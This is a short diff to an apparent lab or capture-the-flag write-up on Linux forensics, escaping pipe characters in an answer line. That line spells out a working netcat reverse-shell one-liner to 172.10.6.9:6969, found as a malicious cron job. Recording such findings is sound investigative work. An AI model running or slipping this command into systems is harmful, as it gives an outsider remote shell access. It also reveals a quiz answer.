@@ -84,7 +84,7 @@ To see the scheduled tasks on a Linux system, we can run `crontab -l`:
 
 We see one job scheduled, and it's attempting to create a reverse shell to the same address and port as before.
 
-**Answer:** /usr/bin/rm /tmp/f;/usr/bin/mkfifo /tmp/f;/usr/bin/cat /tmp/f|/bin/sh -i 2>&1|/usr/bin/nc 172.10.6.9 6969 >/tmp/f
+**Answer:** /usr/bin/rm /tmp/f;/usr/bin/mkfifo /tmp/f;/usr/bin/cat /tmp/f\|/bin/sh -i 2>&1\|/usr/bin/nc 172.10.6.9 6969 >/tmp/f
 
 ### Task 3: Dirty Wordlist Revisited
 
